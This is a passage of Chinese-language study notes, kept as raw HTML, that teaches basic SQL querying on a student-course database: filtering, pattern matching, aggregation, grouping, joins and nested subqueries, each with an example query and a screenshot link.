class=\"token keyword\">AS</span> NAME<span class=\"token punctuation\">,</span><span class=\"token string\">'出生年：'</span><span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage BIRTHDAY<span class=\"token punctuation\">,</span>UPPER<span class=\"token punctuation\">(</span>Sdept<span class=\"token punctuation\">)</span> DEPARTMENT <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201135923229.png\" alt=\"image-20221201135923229\"></p>\n</li>\n</ul>\n</li>\n<li><p>选择表中的若干行（元组）</p>\n<ul>\n<li><p>类似选择</p>\n</li>\n<li><p><code>查询选修了课程的学生雪学号</code>（消除重复行）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token keyword\">DISTINCT</span> Sno <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201140711800.png\" alt=\"image-20221201140711800\"></p>\n</li>\n<li><p>接下来通过where子句使用查询条件进行查询</p>\n<ol>\n<li><p>比较大小</p>\n<ul>\n<li><p><code>查询计算机科学系全体学生的姓名</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142040007.png\" alt=\"image-20221201142040007\"></p>\n</li>\n<li><p><code>查询所有年龄在20岁一下的学生姓名及其年龄</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage<span class=\"token operator\">!</span><span class=\"token operator\">></span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142007098.png\" alt=\"image-20221201142007098\"></p>\n</li>\n<li><p><code>查询考试成绩没有90的学生学号</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token keyword\">DISTINCT</span> Sno <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">where</span> Grade<span class=\"token operator\">&lt;=</span><span class=\"token number\">90</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142333099.png\" alt=\"image-20221201142333099\"></p>\n</li>\n</ul>\n</li>\n<li><p>确定范围</p>\n<p>使用谓词BETWEEN ….AND…确定范围</p>\n<ul>\n<li><p>查询年龄在20~23岁，包括20和23岁之间的学生的姓名系别和年龄</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sdept<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage <span class=\"token operator\">between</span> <span class=\"token number\">20</span> <span class=\"token operator\">and</span> <span class=\"token number\">23</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142947029.png\" alt=\"image-20221201142947029\"></p>\n</li>\n<li><p>查询年龄不在20~23岁，之间的学生的姓名系别和年龄</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sdept<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage <span class=\"token operator\">not</span> <span class=\"token operator\">between</span> <span class=\"token number\">20</span> <span class=\"token operator\">and</span> <span class=\"token number\">23</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201143028072.png\" alt=\"image-20221201143028072\"></p>\n</li>\n</ul>\n</li>\n<li><p>确定集合</p>\n<p>使用谓词IN来查找属性值属于指定集合的元组</p>\n<ul>\n<li><p><code>查询信息系（IS）、数学系（MA）和计算机科学性（CS）学生的姓名和性别。</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Ssex <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept <span class=\"token operator\">IN</span><span class=\"token punctuation\">(</span><span class=\"token string\">'IS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'MA'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201143628640.png\" alt=\"image-20221201143628640\"></p>\n</li>\n<li><p><code>查询即不是信息系，数学系，也不是计算机科学系的学生的姓名和性别</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Ssex <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept <span class=\"token operator\">not</span> <span class=\"token operator\">IN</span><span class=\"token punctuation\">(</span><span class=\"token string\">'IS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'MA'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201143815063.png\" alt=\"image-20221201143815063\"></p>\n</li>\n</ul>\n</li>\n<li><p>字符匹配</p>\n<p>使用谓词like来进行字符串匹配</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token punctuation\">[</span><span class=\"token operator\">NOT</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'&lt;匹配串>'</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">ESCAPE</span> <span class=\"token string\">'&lt;换码字符>'</span><span class=\"token punctuation\">]</span><span class=\"token comment\">/*用%匹配任意字符，用_匹配任意单个字符*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li><p><code>查询学号为201215121的学生的详细情况</code>（字符串为固定字符）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sno <span class=\"token operator\">LIKE</span> <span class=\"token string\">'201215121'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201162259416.png\" alt=\"image-20221201162259416\"></p>\n</li>\n<li><p><code>查询所有刘姓学生的姓名，学号，性别</code>（匹配串为含通配符的字符串）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sno<span class=\"token punctuation\">,</span>Ssex <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sname <span class=\"token operator\">LIKE</span> <span class=\"token string\">'刘%'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201162905296.png\" alt=\"image-20221201162905296\"></p>\n<p><code>查询姓”欧阳“，且全名为三个汉字的学生的姓名</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sname <span class=\"token operator\">LIKE</span> <span class=\"token string\">'欧阳_'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163127358.png\" alt=\"image-20221201163127358\"></p>\n</li>\n<li><p><code>查询以“DB_”开头，且倒数第三个字符为i的课程的详细情况</code>（特殊字符转义）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Course <span class=\"token keyword\">where</span> Cname <span class=\"token operator\">LIKE</span> <span class=\"token string\">'DB\\_%i__'</span> <span class=\"token keyword\">ESCAPE</span> <span class=\"token string\">'\\'; /*escape表示'</span>\\'为转义字符<span class=\"token operator\">*</span><span class=\"token operator\">/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201164143639.png\" alt=\"image-20221201164143639\"></p>\n</li>\n</ul>\n</li>\n<li><p>涉及空值的查询</p>\n<ul>\n<li><p><code>某些学生选修课程后没有参加考试，所以有选课记录，但是没有成绩，查询缺少成绩的学生的学号和相应的课程号</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Grade <span class=\"token operator\">is</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201164934434.png\" alt=\"image-20221201164934434\"></p>\n</li>\n<li><p><code>查询所有有成绩的学生信息</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Grade <span class=\"token operator\">is</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201165045093.png\" alt=\"image-20221201165045093\"></p>\n</li>\n</ul>\n</li>\n<li><p>多重条件查询</p>\n<p>使用and，or来连接条件，and的优先级高于or</p>\n<ul>\n<li><p><code>查询计算机系年龄在20岁一下的学生姓名</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sage<span class=\"token operator\">&lt;=</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201172127267.png\" alt=\"image-20221201172127267\"></p>\n</li>\n</ul>\n</li>\n</ol>\n</li>\n</ul>\n</li>\n<li><p>order by子句</p>\n<ul>\n<li><p>对选择结果排序</p>\n</li>\n<li><p><code>查询选修了2号课程的学生的学号及成绩，查询结果按照分数的降序排列</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Grade <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'2'</span> <span class=\"token keyword\">Order</span> <span class=\"token keyword\">BY</span> Grade <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201222545664.png\" alt=\"image-20221201222545664\"></p>\n</li>\n<li><p><code>查询全体学生情况，查询结果按所在系的系名降序排列，同一系中的学生按年龄的升序排列</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> Sdept <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">,</span>Sage<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201223148145.png\" alt=\"image-20221201223148145\"></p>\n</li>\n</ul>\n</li>\n<li><p>使用集合函数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>\t\t\t\t\t统计元组个数\n<span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> \t统计一列中值的个数\n<span class=\"token function\">SUM</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t统计一列值的总和（此列必须是数值型）\n<span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t计算一列值的平均值（此列必须是整数型）\n<span class=\"token function\">MAX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t求一列中的最大值\n<span class=\"token function\">MIN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t求一列中的最小值<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><p>又称级函数，或者聚集函数，或组函数</p>\n</li>\n<li><p><code>查询学生的总人数</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201223742434.png\" alt=\"image-20221201223742434\"></p>\n</li>\n<li><p><code>查询选修了课程的学生人数</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">DISTINCT</span> Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201224035853.png\" alt=\"image-20221201224035853\"></p>\n</li>\n<li><p><code>计算2号课程的学生的平均成绩</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">WHERE</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201225221482.png\" alt=\"image-20221201225221482\"></p>\n</li>\n</ul>\n</li>\n<li><p>分组（group by子句）</p>\n<ul>\n<li><p>对查询结果分组，将查询的结果再次分组</p>\n</li>\n<li><p><code>求各个课程号及其对应的人数</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Cno<span class=\"token punctuation\">,</span><span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Cno<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201231512674.png\" alt=\"image-20221201231512674\"></p>\n</li>\n<li><p><code>查询选修了一门以上的课程的学生的学号</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> Sno <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sno <span class=\"token keyword\">HAVING</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201231859584.png\" alt=\"image-20221201231859584\"></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"连接查询\"><a href=\"#连接查询\" class=\"headerlink\" title=\"连接查询\"></a>连接查询</h3><p>前面的都只在一个表中进行查询，而连接查询同时涉及<font color=red>多个表</font></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>比较运算符<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span><span class=\"token comment\">#常见的比较运算符主要=,>,&lt;,>=,&lt;=,&lt;>,!=,!>,!&lt;</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token operator\">BETWEEN</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">2</span><span class=\"token operator\">></span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">3</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">3</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><font color=red>比较的两个条件名字可以不同，但是数据类型要是相同的</font></p>\n<ol>\n<li><p>等值与非等值连接查询</p>\n<ul>\n<li><p>等值连接</p>\n<p>连接运算符为&#x3D;</p>\n<ul>\n<li><p><code>查询每个学生及其选修课程的情况</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Student<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202103658842.png\" alt=\"image-20221202103658842\"></p>\n</li>\n<li><p>对上一个例子使用自然连接完成</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Student<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span>Cno<span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span>Grade <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">;</span><span class=\"token comment\">#区别是去掉了比较的重复列</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202103938455.png\" alt=\"image-20221202103938455\"></p>\n</li>\n</ul>\n</li>\n<li><p>自身连接</p>\n<ul>\n<li><p><code>查询每一门课的间接先修课</code>（即先修课的先修课）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> table1<span class=\"token punctuation\">.</span>Con<span class=\"token punctuation\">,</span>table2<span class=\"token punctuation\">.</span>Cpno <span class=\"token keyword\">from</span> Course table1<span class=\"token punctuation\">,</span>Course table2 <span class=\"token keyword\">where</span> table1<span class=\"token punctuation\">.</span>Cpno<span class=\"token operator\">=</span>table2<span class=\"token punctuation\">.</span>Con<span class=\"token punctuation\">;</span><span class=\"token comment\">#这里需要对表进行别名使其自身相比</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202105430451.png\" alt=\"image-20221202105430451\"></p>\n<p><font color=red>注,自身连接由于属性名相同，因此必须要用别名相互区别</font></p>\n</li>\n</ul>\n</li>\n<li><p>多表连接</p>\n<p>顾名思义就是俩个以上的表进行连接</p>\n<ul>\n<li><p><code>查询每个学生的学号姓名选修的课程名及成绩</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Student<span class=\"token punctuation\">.</span>Sname<span class=\"token punctuation\">,</span>Course<span class=\"token punctuation\">.</span>Cname<span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span>Grade <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">,</span>Course<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">WHERE</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno <span class=\"token operator\">and</span> SC<span class=\"token punctuation\">.</span>Cno<span class=\"token operator\">=</span>Course<span class=\"token punctuation\">.</span>Con<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202115556674.png\" alt=\"image-20221202115556674\"></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"嵌套查询\"><a href=\"#嵌套查询\" class=\"headerlink\" title=\"嵌套查询\"></a>嵌套查询</h3><p>在SQL语言中每一个SELECT-FROM-WHERE为一个查询块将一个查询块嵌套到另一个查询块中的where或者having子句中查询称为嵌套查询</p>\n<p>SQL的结构化的含义就是多以层层嵌套的方式来构造程序</p>\n<ol>\n<li><p>带有IN谓词的子查询</p>\n<ul>\n<li><p><code>查询与“刘留”在同一个系的学生</code></p>\n<ul>\n<li><p><font color=blue>先查询“刘留”所在的系</font></p>\n<pre class=\"line-numbers language-SQL\" data-language=\"SQL\"><code class=\"language-SQL\">SELECT Sdept FROM Student where Sname&#x3D;&#39;刘留&#39;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202124310325.png\" alt=\"image-20221202124310325\"></p>\n</li>\n<li><p><font color=blue>在查询所有在CS系的学生</font></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202125011126.png\" alt=\"image-20221202125011126\"></p>\n</li>\n<li><p><font color=blue>将两个语句嵌套完成</font></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sdept <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> Sdept <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sname<span class=\"token operator\">=</span><span class=\"token string\">'刘留'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202125420911.png\" alt=\"image-20221202125420911\"></p>\n<p><code>子查询的条件不依赖父查询，称为不相干子查询</code></p>\n</li>\n</ul>\n</li>\n<li><p><code>查询选修了课程名为“信息系统”的学生学号和姓名</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span>Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Cno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Con <span class=\"token keyword\">from</span> Course <span class=\"token keyword\">where</span> Cname<span class=\"token operator\">=</span><span class=\"token string\">'信息系统'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202131341962.png\" 